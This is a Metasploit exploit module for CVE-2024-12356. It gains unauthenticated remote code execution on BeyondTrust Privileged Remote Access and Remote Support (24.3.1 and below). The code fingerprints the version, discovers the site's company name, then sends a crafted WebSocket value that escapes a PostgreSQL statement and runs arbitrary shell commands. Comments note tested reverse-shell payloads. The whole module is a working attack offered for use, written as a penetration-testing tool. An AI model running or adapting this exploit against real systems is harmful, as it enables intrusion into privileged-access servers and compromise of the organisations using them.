##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Rex::Proto::Http::WebSocket
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits an unauthenticated argument injection vulnerability in BeyondTrust Privileged Remote
          Access (PRA) and Remote Support (RS) to achieve remote code execution as the site user of the targeted site.
          The vulnerability affects PRA and RS versions 24.3.1 and below.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7' # Rapid7 Analysis and Metasploit module
        ],
        'References' => [
          ['CVE', '2024-12356'],
          ['URL', 'https://www.beyondtrust.com/trust-center/security-advisories/bt24-10'], # Vendor Advisory
          # ['URL', ''] # Technical Analysis
        ],
        'DisclosureDate' => '2024-12-16',
        'Platform' => [ 'linux', 'unix' ],
        'Arch' => [ARCH_CMD],
        'Privileged' => false, # Executes as the site user.
        'Targets' => [
          [
            'Default', {
              'Payload' => {
                'DisableNops' => true,
                # Our payload is passed to the PHP function pg_escape_string. We want to avoid any single quotes
                # getting escaped unexpectedly. The server may be configured to escape double quotes (not by default).
                # As we leverage the -e switch from the echo command, we also want to avoid any forward slash characters.
                'BadChars' => '\'"\\'
              }
            }
          ]
        ],
        # NOTE: Tested with the following payloads:
        #   cmd/linux/http/x64/meterpreter/reverse_tcp
        #   cmd/unix/reverse_bash
        #   cmd/unix/generic
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true,
          # A writable directory on the target for fetch based payloads to write to.
          'FETCH_WRITABLE_DIR' => '/var/tmp',
          # Delete the fetch binary after execution.
          'FETCH_DELETE' => true,
          # By default, a deployed site, like Remote Support, is expected to be located at the root path.
          'URIPATH' => '/'
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TargetCompanyName', [false, 'If set, use this name value to identify the company name of the deployed site. By default this is auto discovered.']),
        OptString.new('TargetServerFQDN', [false, 'If set, use this FQDN value to identify the FQDN of the deployed site. By default this is auto discovered.'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'get_rdf'),
      'vars_get' => {
        'comp' => 'sdcust',
        'locale_code' => 'en-us'
      }
    )

    return CheckCode::Unknown('Connection failed') unless res

    return CheckCode::Unknown("Unexpected response code #{res.code == 200}") unless res.code == 200

    return CheckCode::Unknown('Unexpected response content') unless res.body.start_with? '0 Successful'

    # The HTTP content data will have something like this, followed by ~800Kb of string data:

    # 00000000  30 20 53 75 63 63 65 73 73 66 75 6c 0a 65 6e 2d  |0 Successful.en-|
    # 00000010  75 73 0a 31 37 33 37 33 36 38 38 37 32 0a 42 52  |us.1737368872.BR|
    # 00000020  44 46 80 00 0a 91 07 81 32 34 2e 31 2e 32 00 82  |DF......24.1.2..|
    # 00000030  00 00 00 00 67 8e 25 28 91 06 83 65 6e 2d 75 73  |....g.%(...en-us|

    # First there is a "0 Successful\nLOCALE_ID\nTIMESTAMP\n" value, we we use a regex to match this so we can ignore it.

    header = res.body.match(/^(0 Successful\n.+\n\d+\n)/)

    return CheckCode::Unknown('Unexpected response header') unless header

    # Extract the remainder of the data, after the "0 Successful\nLOCALE_ID\nTIMESTAMP\n" pre-amble.
    brdf_data = res.body[header[1].length..]

    return CheckCode::Unknown('Unexpected response data') unless brdf_data.include? 'Thank you for using BeyondTrust'

    # Pull out the magic value (4 bytes), the first tag and its value (file version, 3 bytes), and then the second tag
    # and its value (product version). The product version is encoded as a string, so has two tags, one for the
    # string type (0x91) and the other for the tag type (0x81).
    magic, _, _, prod_version_tag1, file_version_data_len, file_version_tag2 = brdf_data.unpack('NCvCCC')

    # Inspect the data to ensure it looks like what we expect.

    return CheckCode::Unknown('Unexpected header magic') unless magic == 0x42524446 # BRDF

    return CheckCode::Unknown('Unexpected header prod_version_tag1') unless prod_version_tag1 == 0x91 # RDF_SMALL_SIZE

    return CheckCode::Unknown('Unexpected header file_version_tag2') unless file_version_tag2 == 0x81 # RDF_PRODUCT_VERSION

    product_version = brdf_data[10, file_version_data_len - 1]

    # We cannot differentiate between the two affected products, Privileged Remote Access (PRA) and Remote Support (RS).
    # However, they both share a common version number, and a common patch for this vulnerability.
    if Rex::Version.new(product_version) <= Rex::Version.new('24.3.1')
      return CheckCode::Appears("Detected version #{product_version}")
    end

    CheckCode::Safe
  end

  def exploit
    # For the deployed site being targeted (either Privileged Remote Access or Remote Support), we need to know either
    # the company name the site is registered to, or the FQDN of the deployed site. This is required to successfully
    # establish a WebSocket connection to the target site application. By default, we query tha target site to
    # discover this, however a user can optionally set either the expected company name or FQDN as an option.
    site_info = get_site_info

    if site_info.nil?
      fail_with(Failure::UnexpectedReply, 'Failed to get the site info.')
    end

    vprint_status("Company name: #{site_info[:company]}")
    vprint_status("Site FQDN: #{site_info[:server]}")

    headers = {
      # This is the vulnerable application which is reachable over a WebSocket to the target site.
      'Sec-WebSocket-Protocol' => 'ingredi support desk customer thin'
    }

    if !site_info[:company].blank?
      print_status("Using company name: #{site_info[:company]}")

      headers['X-Ns-Company'] = site_info[:company]
    elsif !site_info[:server].blank?
      print_status("Using site FQDN: #{site_info[:server]}")

      headers['Host'] = site_info[:server]
    else
      fail_with(Failure::BadConfig, 'No company name or site FQND set. Either set the TargetCompanyName or TargetServerFQDN option to a valid value, or clear them both to auto discover these values at run time.')
    end

    wsock = connect_ws(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'nw'),
      'headers' => headers
    )

    # Transmit a version for the request. The target may use version 2, but will agree to a lower version. By using a
    # lower version of 1, we expect to be able to exploit older versions of the affected products which do not support
    # version 2.
    wsock.put_wsbinary("1\n")

    # Transmit a random UUID value for the 'thin mint' cookie value.
    wsock.put_wsbinary("#{SecureRandom.uuid}\n")

    # Transmit the auth type we want. Zero is the gskey auth type.
    wsock.put_wsbinary("0\n")

    # Transmit the malicious gskey value and exploit the argument injection vulnerability.
    # Our attacker value will be passed to the echo command, but as a variable, not as a string. We can therefore pass
    # arbitrary arguments to echo. We pass the -e switch, to enable the interpretation of backslash escape sequences.
    # We leverage this to pass an 0xEF character, this will break the interpretation of a PostgreSQL statemtnet, and
    # in turn allow us to overcome the safe quotes that have been put in place. We can escape the current SQL statement
    # and run an arbitrary PostgreSQL client command. By running a \! command, we can execute and arbitrary shell command.
    wsock.put_wsbinary("-e \\\\xEF'; \\\\! #{payload.encoded} #\n")
  rescue Rex::Proto::Http::WebSocket::ConnectionError => e
    if e.http_response && !e.http_response.body.blank?
      if e.http_response.body == 'Invalid company or app name'
        print_error("#{e.http_response.body} - Set either the TargetCompanyName or TargetServerFQDN option to a valid value.")
      else
        print_error(e.http_response.body)
      end
    end
    raise
  end

  def get_site_info
    if !datastore['TargetCompanyName'].blank? || !datastore['TargetServerFQDN'].blank?
      return {
        company: datastore['TargetCompanyName'],
        server: datastore['TargetServerFQDN']
      }
    end

    res1 = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'download_client_connector'),
      'vars_get' => {
        'issue_menu' => '1'
      }
    )

    return error('get_site_info Connection 1 failed.') unless res1

    return error("get_site_info Request 1, unexpected response code #{res1.code}.") unless res1.code == 200

    return error('get_site_info Request 1, unable to match data-html-url') unless res1.body =~ %r{data-html-url="\S+(/chat/html/\S+)"}i

    res2 = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, Rex::Text.html_decode(::Regexp.last_match(1)))
    )

    return error('get_site_info Connection 2 failed.') unless res2

    return error("get_site_info Request 2, unexpected response code #{res2.code}.") unless res2.code == 200

    return error('get_site_info Request 2, unable to match data-company.') unless res2.body =~ /data-company="(\S+)"/i

    company = Rex::Text.html_decode(::Regexp.last_match(1))

    return error('get_site_info Request 2, unable to match data-servers.') unless res2.body =~ /data-servers="(\S+)"/i

    servers = Rex::Text.html_decode(::Regexp.last_match(1))

    servers_array = JSON.parse(servers)

    return error('get_site_info Request 2, data-servers not a valid array.') unless servers_array.instance_of? Array

    return error('get_site_info Request 2, data-servers is an empty array.') if servers_array.empty?

    server = servers_array.first

    { company: company, server: server }
  rescue JSON::ParserError
    error('get_site_info JSON parse error.')
  end

  # Helper method to print an error and then return nil.
  def error(message)
    print_error(message)
    nil
  end
end
